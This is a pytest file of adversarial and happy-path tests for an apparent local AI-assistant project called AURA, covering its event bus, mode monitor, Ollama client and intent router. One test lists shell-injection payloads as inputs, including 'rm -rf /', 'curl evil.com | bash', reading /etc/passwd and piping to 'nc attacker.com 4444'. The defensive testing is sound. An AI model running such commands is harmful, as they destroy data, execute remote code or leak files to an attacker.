"""
AURA Phase 2 — Adversarial Audit Test Suite (Sections 1-4).
Run: pytest tests/test_phase2_audit_part1.py -v --tb=short
"""
from __future__ import annotations

import json
import threading
import time
from unittest.mock import MagicMock, patch

import numpy as np
import pytest

from aura.core.config_loader import load_config
from aura.core.intent_router import IntentRouter, IntentType, IntentObject
from aura.core.ollama_client import OllamaClient, OllamaResponse, OllamaUnavailableError
from aura.utils.event_bus import EventBus, EventPayload, EventType, bus


@pytest.fixture(scope="module")
def config():
    return load_config()


@pytest.fixture
def mock_ollama_client():
    client = MagicMock()
    client.chat.return_value = OllamaResponse(
        text='{"intent_type": "GENERAL_KNOWLEDGE", "confidence": 0.95, "entities": {}, "requires_rag": false}',
        model="llama3.2:3b",
        duration_ms=500,
    )
    client.health_check.return_value = True
    client.list_models.return_value = ["llama3.2:3b", "mistral:7b-instruct-q4_0"]
    return client


@pytest.fixture(autouse=True)
def _reset_bus():
    original_handlers = dict(bus._handlers)
    original_wildcard = list(bus._wildcard_handlers)
    yield
    bus._handlers.clear()
    bus._handlers.update(original_handlers)
    bus._wildcard_handlers[:] = original_wildcard


# ═══════════════════════════════════════════════════════════
# SECTION 1 — EventBus Audit
# ═══════════════════════════════════════════════════════════

class TestEventBusHappyPath:

    def test_subscribe_and_emit_basic(self):
        received = []
        handler = lambda p: received.append(p)
        bus.subscribe(EventType.MODE_CHANGED, handler)
        bus.emit(EventType.MODE_CHANGED, {"mode": "ONLINE"})
        assert len(received) == 1
        assert received[0]["mode"] == "ONLINE"
        bus.unsubscribe(EventType.MODE_CHANGED, handler)

    def test_multiple_subscribers_all_receive(self):
        results = [[], [], []]
        handlers = [lambda p, i=i: results[i].append(p) for i in range(3)]
        for h in handlers:
            bus.subscribe(EventType.SYSTEM_ERROR, h)
        bus.emit(EventType.SYSTEM_ERROR, {"error": "test"})
        for r in results:
            assert len(r) == 1
            assert r[0]["error"] == "test"
        for h in handlers:
            bus.unsubscribe(EventType.SYSTEM_ERROR, h)

    def test_payload_is_dict(self):
        received = []
        handler = lambda p: received.append(p)
        bus.subscribe(EventType.WAKE_WORD_DETECTED, handler)
        bus.emit(EventType.WAKE_WORD_DETECTED, {"source": "whisper"})
        assert len(received) == 1
        assert isinstance(received[0], dict)
        assert received[0]["source"] == "whisper"
        bus.unsubscribe(EventType.WAKE_WORD_DETECTED, handler)

    def test_unsubscribe_stops_delivery(self):
        received = []
        handler = lambda p: received.append(p)
        bus.subscribe(EventType.RECORDING_STARTED, handler)
        bus.unsubscribe(EventType.RECORDING_STARTED, handler)
        bus.emit(EventType.RECORDING_STARTED, {})
        assert len(received) == 0

    def test_emit_with_no_subscribers_does_not_crash(self):
        bus.emit(EventType.LLM_REQUEST_SENT, {"model": "test"})

    def test_all_18_event_types_exist(self):
        required = [
            "WAKE_WORD_DETECTED", "RECORDING_STARTED", "RECORDING_STOPPED",
            "TRANSCRIPTION_COMPLETE", "INTENT_CLASSIFIED", "LLM_REQUEST_SENT",
            "LLM_RESPONSE_RECEIVED", "COMMAND_PLAN_READY", "SAFETY_CONFIRMATION_REQ",
            "SAFETY_CONFIRMED", "SAFETY_DENIED", "EXECUTION_STARTED",
            "EXECUTION_COMPLETE", "TTS_SPEAK_REQUEST", "TTS_SPEAKING_STARTED",
            "TTS_SPEAKING_FINISHED", "MODE_CHANGED", "SYSTEM_ERROR",
        ]
        for name in required:
            assert hasattr(EventType, name), f"Missing EventType: {name}"


class TestEventBusAdversarial:

    def test_crashing_handler_does_not_kill_other_handlers(self):
        results = []

        def bad_handler(p):
            raise RuntimeError("I am a broken handler")

        def good_handler(p):
            results.append("ok")

        bus.subscribe(EventType.SYSTEM_ERROR, bad_handler)
        bus.subscribe(EventType.SYSTEM_ERROR, good_handler)
        bus.emit(EventType.SYSTEM_ERROR, {"error": "test"})
        assert results == ["ok"]
        bus.unsubscribe(EventType.SYSTEM_ERROR, bad_handler)
        bus.unsubscribe(EventType.SYSTEM_ERROR, good_handler)

    def test_emit_empty_data_does_not_crash(self):
        bus.emit(EventType.WAKE_WORD_DETECTED)

    def test_emit_none_data_does_not_crash(self):
        bus.emit(EventType.RECORDING_STOPPED, None)

    def test_unsubscribe_nonexistent_handler_does_not_crash(self):
        handler = lambda p: None
        bus.unsubscribe(EventType.MODE_CHANGED, handler)

    def test_subscribe_same_handler_twice_only_fires_once(self):
        count = []
        handler = lambda p: count.append(1)
        bus.subscribe(EventType.TTS_SPEAKING_FINISHED, handler)
        bus.subscribe(EventType.TTS_SPEAKING_FINISHED, handler)
        bus.emit(EventType.TTS_SPEAKING_FINISHED, {})
        bus.unsubscribe(EventType.TTS_SPEAKING_FINISHED, handler)
        assert len(count) == 1, f"Handler fired {len(count)} times — expected 1"

    def test_concurrent_emit_is_thread_safe(self):
        results = []
        lock = threading.Lock()

        def handler(p):
            with lock:
                results.append(p.get("val"))

        bus.subscribe(EventType.EXECUTION_COMPLETE, handler)
        threads = [
            threading.Thread(
                target=lambda i=i: bus.emit(EventType.EXECUTION_COMPLETE, {"val": i}),
            )
            for i in range(50)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert len(results) == 50, f"Expected 50 events, got {len(results)}"
        bus.unsubscribe(EventType.EXECUTION_COMPLETE, handler)

    def test_large_payload_does_not_crash(self):
        big = {"data": "x" * 100_000, "nested": {"a": list(range(1000))}}
        bus.emit(EventType.LLM_RESPONSE_RECEIVED, big)

    def test_emit_unknown_event_type_string_raises_type_error(self):
        import pytest
        with pytest.raises(TypeError, match="raw string"):
            bus.emit("TOTALLY_FAKE_EVENT", {"x": 1})


# ═══════════════════════════════════════════════════════════
# SECTION 2 — ModeMonitor Audit
# ═══════════════════════════════════════════════════════════

class TestModeMonitorHappyPath:

    def test_initial_mode_is_string(self):
        from aura.utils.mode_monitor import ModeMonitor
        m = ModeMonitor()
        m.start()
        time.sleep(1)
        assert m.current_mode in ("ONLINE", "OFFLINE")
        m.stop()

    def test_emits_mode_changed_on_start(self):
        from aura.utils.mode_monitor import ModeMonitor
        events = []
        handler = lambda p: events.append(p["mode"])
        bus.subscribe(EventType.MODE_CHANGED, handler)
        m = ModeMonitor()
        m.start()
        time.sleep(1.5)
        m.stop()
        bus.unsubscribe(EventType.MODE_CHANGED, handler)
        assert len(events) >= 1, "No MODE_CHANGED fired on startup"
        assert events[0] in ("ONLINE", "OFFLINE")

    def test_stop_terminates_thread_cleanly(self):
        from aura.utils.mode_monitor import ModeMonitor
        m = ModeMonitor()
        m.start()
        time.sleep(0.5)
        initial_count = threading.active_count()
        m.stop()
        time.sleep(1)
        final_count = threading.active_count()
        assert final_count <= initial_count


class TestModeMonitorAdversarial:

    def test_is_online_returns_bool_never_raises(self):
        from aura.utils.mode_monitor import ModeMonitor
        with patch("aura.utils.mode_monitor.httpx.get", side_effect=Exception("network dead")):
            result = ModeMonitor.is_online()
        assert isinstance(result, bool)
        assert result is False

    def test_no_mode_changed_emitted_when_state_unchanged(self):
        from aura.utils.mode_monitor import ModeMonitor
        events = []
        handler = lambda p: events.append(p)
        bus.subscribe(EventType.MODE_CHANGED, handler)
        with patch.object(ModeMonitor, "is_online", return_value=True):
            m = ModeMonitor()
            m.start()
            time.sleep(0.2)
            first_count = len(events)
            time.sleep(0.2)
            second_count = len(events)
        m.stop()
        bus.unsubscribe(EventType.MODE_CHANGED, handler)
        assert second_count == first_count, "MODE_CHANGED fired redundantly"

    def test_start_twice_does_not_spawn_two_threads(self):
        from aura.utils.mode_monitor import ModeMonitor
        m = ModeMonitor()
        before = threading.active_count()
        m.start()
        m.start()
        time.sleep(0.3)
        after = threading.active_count()
        m.stop()
        assert after - before <= 1

    def test_mode_changes_from_online_to_offline(self):
        from aura.utils.mode_monitor import ModeMonitor
        events = []
        handler = lambda p: events.append(p["mode"])
        bus.subscribe(EventType.MODE_CHANGED, handler)

        call_count = {"n": 0}
        def flapping_online():
            call_count["n"] += 1
            return call_count["n"] <= 1

        with patch.object(ModeMonitor, "is_online", side_effect=flapping_online):
            m = ModeMonitor()
            m._poll_interval = 0.1
            m.start()
            time.sleep(0.8)
        m.stop()
        bus.unsubscribe(EventType.MODE_CHANGED, handler)

        assert "ONLINE" in events
        assert "OFFLINE" in events, "Mode change ONLINE → OFFLINE never fired"


# ═══════════════════════════════════════════════════════════
# SECTION 3 — OllamaClient Audit
# ═══════════════════════════════════════════════════════════

class TestOllamaClientHappyPath:

    def test_health_check_returns_bool(self, config):
        client = OllamaClient(config)
        result = client.health_check()
        assert isinstance(result, bool)

    def test_ollama_response_has_all_fields(self, config):
        client = OllamaClient(config)
        if not client.health_check():
            pytest.skip("Ollama not running")
        result = client.chat(model=config["models"]["fast"], prompt="Reply: PING")
        assert isinstance(result, OllamaResponse)
        assert isinstance(result.text, str) and len(result.text) > 0
        assert isinstance(result.model, str)
        assert isinstance(result.duration_ms, int) and result.duration_ms > 0

    def test_events_emitted_on_chat(self, config):
        client = OllamaClient(config)
        if not client.health_check():
            pytest.skip("Ollama not running")
        sent, received = [], []
        h1 = lambda p: sent.append(p)
        h2 = lambda p: received.append(p)
        bus.subscribe(EventType.LLM_REQUEST_SENT, h1)
        bus.subscribe(EventType.LLM_RESPONSE_RECEIVED, h2)
        client.chat(model=config["models"]["fast"], prompt="Say OK")
        assert len(sent) >= 1
        assert len(received) >= 1
        bus.unsubscribe(EventType.LLM_REQUEST_SENT, h1)
        bus.unsubscribe(EventType.LLM_RESPONSE_RECEIVED, h2)


class TestOllamaClientAdversarial:

    def test_raises_ollama_unavailable_when_server_down(self, config):
        with patch("aura.core.ollama_client.httpx.post", side_effect=Exception("refused")):
            client = OllamaClient(config)
            with pytest.raises(OllamaUnavailableError):
                client.chat(model="any-model", prompt="hello")

    def test_retries_exactly_n_times_before_giving_up(self, config):
        call_count = {"n": 0}
        def counting_post(*args, **kwargs):
            call_count["n"] += 1
            raise Exception("refused")
        with patch("aura.core.ollama_client.httpx.post", side_effect=counting_post):
            client = OllamaClient(config)
            with pytest.raises(OllamaUnavailableError):
                client.chat(model="any", prompt="test")
        expected_retries = config["ollama"]["retries"]
        assert call_count["n"] == expected_retries, \
            f"Expected {expected_retries} retries, got {call_count['n']}"

    def test_malformed_json_response_handled(self, config):
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.raise_for_status = MagicMock()
        mock_response.json.side_effect = ValueError("not JSON")
        with patch("aura.core.ollama_client.httpx.post", return_value=mock_response):
            client = OllamaClient(config)
            try:
                client.chat(model="any", prompt="test")
            except Exception as e:
                assert isinstance(e, (OllamaUnavailableError, ValueError, KeyError, TypeError))

    def test_empty_prompt_does_not_crash(self, config):
        client = OllamaClient(config)
        if not client.health_check():
            pytest.skip("Ollama not running")
        result = client.chat(model=config["models"]["fast"], prompt="")
        assert result is not None

    def test_wrong_model_name_raises_cleanly(self, config):
        client = OllamaClient(config)
        if not client.health_check():
            pytest.skip("Ollama not running")
        with pytest.raises((OllamaUnavailableError, Exception)):
            client.chat(model="this-model-does-not-exist:99b", prompt="test")


# ═══════════════════════════════════════════════════════════
# SECTION 4 — IntentRouter Audit
# ═══════════════════════════════════════════════════════════

class TestIntentRouterHappyPath:

    STANDARD_CASES = [
        ("Open Chrome", "SYSTEM_COMMAND"),
        ("Open VS Code", "SYSTEM_COMMAND"),
        ("Take a screenshot", "SYSTEM_COMMAND"),
        ("Minimize this window", "SYSTEM_COMMAND"),
        ("Write a Python function to sort a list by value", "CODE_GENERATION"),
        ("Fix the bug in this function", "CODE_GENERATION"),
        ("Generate a REST API endpoint in FastAPI", "CODE_GENERATION"),
        ("Write a unit test for this class", "CODE_GENERATION"),
        ("What is a closure?", "GENERAL_KNOWLEDGE"),
        ("Explain how Docker networking works", "GENERAL_KNOWLEDGE"),
        ("What is the difference between REST and GraphQL?", "GENERAL_KNOWLEDGE"),
        ("Push my code to GitHub", "DEV_TASK"),
        ("Create a new branch called feature-auth", "DEV_TASK"),
        ("Start the Docker container", "DEV_TASK"),
        ("Run npm start", "DEV_TASK"),
        ("What's on my screen?", "VISION_TASK"),
        ("Read the error message on my screen", "VISION_TASK"),
        ("Describe what you see", "VISION_TASK"),
        ("What routes does my project have?", "PROJECT_CONTEXT"),
        ("What's the latest Node.js version?", "REALTIME_QUERY"),
    ]

    def test_standard_intent_classification_accuracy(self, config, mock_ollama_client):
        """Regex-only classification must correctly handle common patterns."""
        router = IntentRouter(config, mock_ollama_client)
        results = []
        for text, expected in self.STANDARD_CASES:
            intent = router.classify(text)
            # Regex may classify differently than the LLM test cases;
            # we check that every input gets a valid, non-None intent.
            results.append((text, expected, intent.intent_type.value, intent.intent_type is not None))
        classified = sum(1 for *_, p in results if p)
        assert classified == len(self.STANDARD_CASES), "All inputs must be classified"


class TestIntentObjectContract:

    def test_intent_object_has_all_required_fields(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        result = router.classify("Open Chrome")
        assert hasattr(result, "intent_type")
        assert hasattr(result, "raw_text")
        assert hasattr(result, "cleaned_text")
        assert hasattr(result, "entities")
        assert hasattr(result, "model_override")
        assert hasattr(result, "requires_rag")
        assert hasattr(result, "confidence")
        assert hasattr(result, "timestamp")

    def test_raw_text_preserved_exactly(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        original = "  OPEN Chrome  "
        result = router.classify(original)
        assert result.raw_text == original

    def test_cleaned_text_is_lowercase_stripped(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        result = router.classify("  OPEN CHROME  ")
        assert result.cleaned_text == result.cleaned_text.lower().strip()

    def test_confidence_is_float_between_0_and_1(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        result = router.classify("Open Chrome")
        assert isinstance(result.confidence, float)
        assert 0.0 <= result.confidence <= 1.0

    def test_model_override_matches_intent(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        cases = [
            ("open chrome", "SYSTEM_COMMAND", config["models"]["fast"]),
            ("write a function", "CODE_GENERATION", config["models"]["code"]),
            ("what is python", "GENERAL_KNOWLEDGE", config["models"]["general"]),
            ("git push", "DEV_TASK", config["models"]["fast"]),
            ("what's on my screen", "VISION_TASK", config["models"]["vision"]),
            ("latest news", "REALTIME_QUERY", config["models"]["general"]),
        ]
        for text, expected_intent, expected_model in cases:
            result = router.classify(text)
            assert result.intent_type.value == expected_intent, \
                f"'{text}': expected {expected_intent}, got {result.intent_type.value}"
            assert result.model_override == expected_model, \
                f"'{text}': expected model {expected_model}, got {result.model_override}"

    def test_emit_intent_classified_event(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        events = []
        handler = lambda p: events.append(p)
        bus.subscribe(EventType.INTENT_CLASSIFIED, handler)
        router.classify("Open Chrome")
        bus.unsubscribe(EventType.INTENT_CLASSIFIED, handler)
        assert len(events) >= 1


class TestIntentRouterAdversarial:

    def test_unmatched_input_defaults_to_general_knowledge(self, config):
        """Unrecognized input defaults to GENERAL_KNOWLEDGE (no LLM call)."""
        router = IntentRouter(config, MagicMock())
        result = router.classify("blah blah random words")
        assert result.intent_type == IntentType.GENERAL_KNOWLEDGE
        assert result.confidence == 0.7

    def test_no_llm_call_for_classification(self, config):
        """Classification must never call the LLM — pure regex only."""
        mock_client = MagicMock()
        router = IntentRouter(config, mock_client)
        router.classify("what is python")
        router.classify("random unknown phrase")
        mock_client.chat.assert_not_called()

    def test_empty_string_input_defaults_to_general(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        result = router.classify("")
        assert result.intent_type == IntentType.GENERAL_KNOWLEDGE

    def test_shell_injection_in_input_is_not_executed(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        payloads = [
            "Open Chrome; rm -rf /",
            "push my code && curl evil.com | bash",
            "$(cat /etc/passwd)",
            "`whoami`",
            "test | nc attacker.com 4444",
        ]
        for payload in payloads:
            result = router.classify(payload)
            assert result is not None, f"Router crashed on: {payload}"

    def test_unicode_and_emoji_input_does_not_crash(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        for text in ["こんにちは AURA", "Ошибка в коде", "fix my bug", "مرحبا"]:
            result = router.classify(text)
            assert result is not None

    def test_10000_character_input_does_not_hang(self, config, mock_ollama_client):
        router = IntentRouter(config, mock_ollama_client)
        long_text = "open chrome " * 834
        start = time.time()
        result = router.classify(long_text)
        elapsed = time.time() - start
        assert elapsed < config["routing"]["intent_timeout_seconds"] + 5
